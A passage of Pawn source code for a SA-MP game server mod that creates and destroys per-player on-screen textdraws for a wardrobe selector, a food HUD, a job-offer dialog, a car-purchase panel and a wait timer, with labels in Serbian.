		Ormar[ playerid ][ 4 ] = CreatePlayerTextDraw( playerid,261.000000, 344.000000, "New Textdraw");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 4 ], 0);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 4 ], 5);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 4 ], 0.000, 0.000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 4 ], -1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 4 ], 1);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 4 ], 1);
		PlayerTextDrawUseBox( playerid,Ormar[ playerid ][ 4 ], 1);
		PlayerTextDrawBoxColor( playerid,Ormar[ playerid ][ 4 ], 255);
		PlayerTextDrawTextSize( playerid,Ormar[ playerid ][ 4 ], 103.000000, 80.000000);
		PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 4 ], 19);
		PlayerTextDrawSetPreviewRot( playerid, Ormar[ playerid ][ 4 ], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 4 ], 1);

		Ormar[ playerid ][ 5 ] = CreatePlayerTextDraw( playerid,377.000000, 344.000000, "New Textdraw");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 5 ], 0);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 5 ], 5);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 5 ], 0.000, 0.000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 5 ], -1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 5 ], 1);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 5 ], 1);
		PlayerTextDrawUseBox( playerid,Ormar[ playerid ][ 5 ], 1);
		PlayerTextDrawBoxColor( playerid,Ormar[ playerid ][ 5 ], 255);
		PlayerTextDrawTextSize( playerid,Ormar[ playerid ][ 5 ], 103.000000, 80.000000);
		PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 5 ], 110);
		PlayerTextDrawSetPreviewRot( playerid, Ormar[ playerid ][ 5 ], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 5 ], 1);

		Ormar[ playerid ][ 6 ] = CreatePlayerTextDraw( playerid,234.000000, 419.000000, "-");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 6 ], 255);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 6 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 6 ], 10.220003, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 6 ], SRVBOJA1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 6 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 6 ], 1);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 6 ], 0);

		Ormar[ playerid ][ 7 ] = CreatePlayerTextDraw( playerid,134.000000, 419.000000, "-");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 7 ], 255);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 7 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 7 ], 10.220003, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 7 ], SRVBOJA1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 7 ], 1);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 7 ], 0);

        Ormar[ playerid ][ 8 ] = CreatePlayerTextDraw( playerid, 305.000000, 330.000000, "Izaberi_odecu");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 8 ], 255 );
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 8 ], 0 );
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 8 ], 0.500000, 1.000000);
		PlayerTextDrawTextSize( playerid,Ormar[ playerid ][ 8 ], 40.000000, 10.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 8 ], -1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 8 ], 1 );
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 8 ], 1 );
		PlayerTextDrawAlignment( playerid, Ormar[ playerid ][ 8 ], 2 );
		PlayerTextDrawSetShadow( playerid, Ormar[ playerid ][ 8 ], 1 );
		PlayerTextDrawSetSelectable( playerid, Ormar[ playerid ][ 8 ], 1 );

		Ormar[ playerid ][ 9 ] = CreatePlayerTextDraw( playerid,458.000000, 331.000000, "X");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 9 ], 255);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 9 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 9 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 9 ], -16776961);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 9 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 9 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 9 ], 1);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 9 ], 1);

    }
	else if( show == false ) {
		for( new i = 0; i < 10; i ++) {
			PlayerTextDrawHide( playerid, Ormar[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Ormar[ playerid ][ i ] );
			Ormar[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------
stock CKilometriTDControl( playerid, bool:show ) {
	if( show == true ) {
	    CKilometri[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid,384.000000, 407.000000, "  ");
		PlayerTextDrawBackgroundColor(playerid,CKilometri[ playerid ][ 0 ], 255);
		PlayerTextDrawFont(playerid,CKilometri[ playerid ][ 0 ], 1);
		PlayerTextDrawLetterSize(playerid,CKilometri[ playerid ][ 0 ], 0.500000, 1.700000);
		PlayerTextDrawColor(playerid,CKilometri[ playerid ][ 0 ], -1);
		PlayerTextDrawSetOutline(playerid,CKilometri[ playerid ][ 0 ], 0);
		PlayerTextDrawSetProportional(playerid,CKilometri[ playerid ][ 0 ], 1);
		PlayerTextDrawSetShadow(playerid,CKilometri[ playerid ][ 0 ], 1);
		PlayerTextDrawUseBox(playerid,CKilometri[ playerid ][ 0 ], 1);
		PlayerTextDrawBoxColor(playerid,CKilometri[ playerid ][ 0 ], 100);
		PlayerTextDrawTextSize(playerid,CKilometri[ playerid ][ 0 ], 266.000000, 40.000000);
		PlayerTextDrawSetSelectable(playerid,CKilometri[ playerid ][ 0 ], 0);

		CKilometri[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid,325.000000, 405.000000, "Chicken Burger");
		PlayerTextDrawAlignment(playerid,CKilometri[ playerid ][ 1 ], 2);
		PlayerTextDrawBackgroundColor(playerid,CKilometri[ playerid ][ 1 ], 255);
		PlayerTextDrawFont(playerid,CKilometri[ playerid ][ 1 ], 2);
		PlayerTextDrawLetterSize(playerid,CKilometri[ playerid ][ 1 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,CKilometri[ playerid ][ 1 ], -1);
		PlayerTextDrawSetOutline(playerid,CKilometri[ playerid ][ 1 ], 0);
		PlayerTextDrawSetProportional(playerid,CKilometri[ playerid ][ 1 ], 1);
		PlayerTextDrawSetShadow(playerid,CKilometri[ playerid ][ 1 ], 1);
		PlayerTextDrawSetSelectable(playerid,CKilometri[ playerid ][ 1 ], 0);

		CKilometri[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid,275.000000, 414.000000, "Cena: 60$");
		PlayerTextDrawBackgroundColor(playerid,CKilometri[ playerid ][ 2 ], 255);
		PlayerTextDrawFont(playerid,CKilometri[ playerid ][ 2 ], 2);
		PlayerTextDrawLetterSize(playerid,CKilometri[ playerid ][ 2 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,CKilometri[ playerid ][ 2 ], -1);
		PlayerTextDrawSetOutline(playerid,CKilometri[ playerid ][ 2 ], 0);
		PlayerTextDrawSetProportional(playerid,CKilometri[ playerid ][ 2 ], 1);
		PlayerTextDrawSetShadow(playerid,CKilometri[ playerid ][ 2 ], 1);
		PlayerTextDrawSetSelectable(playerid,CKilometri[ playerid ][ 2 ], 0);

		CKilometri[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid,265.000000, 412.000000, "-");
		PlayerTextDrawBackgroundColor(playerid,CKilometri[ playerid ][ 3 ], 255);
		PlayerTextDrawFont(playerid,CKilometri[ playerid ][ 3 ], 2);
		PlayerTextDrawLetterSize(playerid,CKilometri[ playerid ][ 3 ], 9.800001, 0.499999);
		PlayerTextDrawColor(playerid,CKilometri[ playerid ][ 3 ], 1321128447);
		PlayerTextDrawSetOutline(playerid,CKilometri[ playerid ][ 3 ], 0);
		PlayerTextDrawSetProportional(playerid,CKilometri[ playerid ][ 3 ], 1);
		PlayerTextDrawSetShadow(playerid,CKilometri[ playerid ][ 3 ], 1);
		PlayerTextDrawSetSelectable(playerid,CKilometri[ playerid ][ 3 ], 0);

        for( new i = 0; i < 4; i ++) {
			PlayerTextDrawShow( playerid, CKilometri[ playerid ][ i ] );
		}
	}
	else if( show == false ) {
		for( new i = 0; i < 4; i ++) {
			PlayerTextDrawHide( playerid, CKilometri[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, CKilometri[ playerid ][ i ] );
			CKilometri[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------

stock ZaposljavanjeTDControl( playerid, bool:show, string1[], string2[], string3[] ) {
	if( show == true ) {
	
        if(zaposljavanjeDelay[playerid]) return 0;

	    ZaposljavanjeTD[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 391.375000, 352.083496, "usebox");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 0.000000, 7.285187);
		PlayerTextDrawTextSize(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 243.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, ZaposljavanjeTD[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 0 ], 0);

		ZaposljavanjeTD[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 317.500000, 351.166961, "Kosac trave");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 0.398749, 1.384164);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 2);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 1321128447);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 3);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 1 ], 1);

		ZaposljavanjeTD[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 321.625000, 364.416931, "-");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 10.333113, 0.223331);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 2);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 2 ], -1);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 3);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 2 ], 1);

		ZaposljavanjeTD[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 249.125000, 368.500274, "zarada:             ~w~100$");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 0.296249, 0.870831);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 1321128447);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 2);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 3 ], 1);

		ZaposljavanjeTD[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 249.500000, 377.083587, "ugovor:              ~w~5h");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 0.296249, 0.870831);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 1321128447);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 2);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 4 ], 1);

		ZaposljavanjeTD[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 245.625000, 387.333251, "-");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 9.959370, 0.310833);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 5 ], -1);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 1);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 5 ], 1);

		ZaposljavanjeTD[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 373.875000, 400.499969, "usebox");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 0.000000, 1.303708);
		PlayerTextDrawTextSize(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 260.500000, 0.000000);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 0);
		PlayerTextDrawUseBox(playerid, ZaposljavanjeTD[ playerid ][ 6 ], true);
		PlayerTextDrawBoxColor(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 102);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 0);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 6 ], 0);

		ZaposljavanjeTD[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 317.875000, 400.000366, "prihvati posao");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 0.398749, 1.384164);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 7 ], -1);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 3);
		PlayerTextDrawSetProportional(playerid, ZaposljavanjeTD[ playerid ][ 7 ], 1);
		PlayerTextDrawSetSelectable(playerid, ZaposljavanjeTD[ playerid ][ 7 ], true);

		ZaposljavanjeTD[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 379.375000, 345.333465, "ld_beat:cross");
		PlayerTextDrawLetterSize(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 15.000000, 12.250007);
		PlayerTextDrawAlignment(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, ZaposljavanjeTD[ playerid ][ 8 ], -1);
		PlayerTextDrawSetShadow(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 0);
		PlayerTextDrawFont(playerid, ZaposljavanjeTD[ playerid ][ 8 ], 4);
		PlayerTextDrawSetSelectable(playerid, ZaposljavanjeTD[ playerid ][ 8 ], true);
	
	    PlayerTextDrawSetString( playerid, ZaposljavanjeTD[ playerid ][ 1 ], string1 );
	    PlayerTextDrawSetString( playerid, ZaposljavanjeTD[ playerid ][ 3 ], string2 );
	    PlayerTextDrawSetString( playerid, ZaposljavanjeTD[ playerid ][ 4 ], string3 );
	    
	    SetTimerEx( "ShowZaposljavanjeTD", 150, false, "d", playerid );

	}
	else if( show == false ) {
		for( new i = 0; i < 9; i ++) {
			PlayerTextDrawHide( playerid, ZaposljavanjeTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, ZaposljavanjeTD[ playerid ][ i ] );
			ZaposljavanjeTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
        zaposljavanjeDelay[playerid] = true;
        defer zaposljavanjeTimer(playerid);
		PosaoTDShowed[ playerid ] = false;
	}
    return 1;
}

forward ShowZaposljavanjeTD( playerid );
public ShowZaposljavanjeTD( playerid ) {

	for( new i = 0; i < 9; i ++ ) {
		PlayerTextDrawShow( playerid, ZaposljavanjeTD[ playerid ][ i ] );
	}
	SelectTextDraw( playerid, SRVBOJA1 );
	PosaoTDShowed[ playerid ] = true;
	return 1;
}

stock BuyCarTDControl( playerid, bool:show ) {
	if( show == true ) {
	    BuyCar[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 415.750000, 377.749847, "usebox");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 0 ], 0.000000, 4.951847);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 0 ], 221.125000, 0.000000);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, BuyCar[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, BuyCar[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 0 ], 0);

		BuyCar[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 382.500000, 392.583282, "ld_beat:right");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 1 ], 0.745625, 2.690833);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 1 ], 26.875000, 12.250002);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 1 ], -1);
		PlayerTextDrawUseBox(playerid, BuyCar[ playerid ][ 1 ], true);
		PlayerTextDrawBoxColor(playerid, BuyCar[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 1 ], 4);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 1 ], 1);
		PlayerTextDrawSetSelectable(playerid, BuyCar[ playerid ][ 1 ], true);

		BuyCar[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 316.875000, 375.083404, "Hotring Racer A");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 2 ], 0.336874, 1.191665);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 2 ], 2);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 2 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 2 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 2 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 2 ], 2);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 2 ], 1);

		BuyCar[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 321.250000, 410.666687, "Cena: ~w~10000000$");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 3 ], 0.334374, 1.016666);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 3 ], 2);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 3 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 3 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 3 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 3 ], 2);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 3 ], 1);

		BuyCar[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 227.250000, 392.416595, "ld_beat:left");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 4 ], 0.745625, 2.690833);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 4 ], 26.875000, 12.250001);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 4 ], -1);
		PlayerTextDrawUseBox(playerid, BuyCar[ playerid ][ 4 ], true);
		PlayerTextDrawBoxColor(playerid, BuyCar[ playerid ][ 4 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 4 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 4 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 4 ], 4);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 4 ], 1);
		PlayerTextDrawSetSelectable(playerid, BuyCar[ playerid ][ 4 ], true);

		BuyCar[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 233.750000, 387.333099, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 5 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 5 ], 173.125000, 0.583333);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 5 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 5 ], 0);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 5 ], 4);

		BuyCar[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 234.125000, 408.750152, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 6 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 6 ], 173.125000, 0.583333);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 6 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 6 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 6 ], 0);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 6 ], 4);

		BuyCar[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 319.375000, 394.333282, "kupi_vozilo");
		PlayerTextDrawTextSize( playerid, BuyCar[ playerid ][ 7 ], 23.000000, 13.000000);
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 7 ], 0.338750, 0.742499);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 7 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 7 ], 2);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 7 ], 1);
		PlayerTextDrawSetSelectable(playerid, BuyCar[ playerid ][ 7 ], true);

		BuyCar[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 399.500000, 371.249847, "ld_beat:cross");
		PlayerTextDrawLetterSize(playerid, BuyCar[ playerid ][ 8 ], 0.745625, 2.690833);
		PlayerTextDrawTextSize(playerid, BuyCar[ playerid ][ 8 ], 18.125000, 10.500000);
		PlayerTextDrawAlignment(playerid, BuyCar[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, BuyCar[ playerid ][ 8 ], -1);
		PlayerTextDrawUseBox(playerid, BuyCar[ playerid ][ 8 ], true);
		PlayerTextDrawBoxColor(playerid, BuyCar[ playerid ][ 8 ], -1);
		PlayerTextDrawSetShadow(playerid, BuyCar[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, BuyCar[ playerid ][ 8 ], 1);
		PlayerTextDrawBackgroundColor(playerid, BuyCar[ playerid ][ 8 ], 51);
		PlayerTextDrawFont(playerid, BuyCar[ playerid ][ 8 ], 4);
		PlayerTextDrawSetProportional(playerid, BuyCar[ playerid ][ 8 ], 1);
		PlayerTextDrawSetSelectable(playerid, BuyCar[ playerid ][ 8 ], true);

        for( new i = 0; i < 9; i ++) {
			PlayerTextDrawShow( playerid, BuyCar[ playerid ][ i ] );
		}
		
		BuyCarTDShowed[ playerid ] = true;

	}
	else if( show == false ) {
		for( new i = 0; i < 9; i ++) {
			PlayerTextDrawHide( playerid, BuyCar[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, BuyCar[ playerid ][ i ] );
			BuyCar[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
		
		BuyCarTDShowed[ playerid ] = false;
	}
}
//------------------------------------------------------------------------------
stock VremeTDControl( playerid, bool:show ) {
	if( show == true ) {
	    PVreme[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 395.750000, 411.583312, "  ");
		PlayerTextDrawLetterSize(playerid, PVreme[ playerid ][ 0 ], 0.000000, 1.238888);
		PlayerTextDrawTextSize(playerid, PVreme[ playerid ][ 0 ], 240.500000, 0.000000);
		PlayerTextDrawAlignment(playerid, PVreme[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, PVreme[ playerid ][ 0 ], 0);
		PlayerTextDrawUseBox(playerid, PVreme[ playerid ][ 0 ], true);
		PlayerTextDrawBoxColor(playerid, PVreme[ playerid ][ 0 ], 102);
		PlayerTextDrawSetShadow(playerid, PVreme[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, PVreme[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, PVreme[ playerid ][ 0 ], 0);

		PVreme[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 318.750000, 411.833435, "~w~Pricekajte, Vreme: ~y~180");
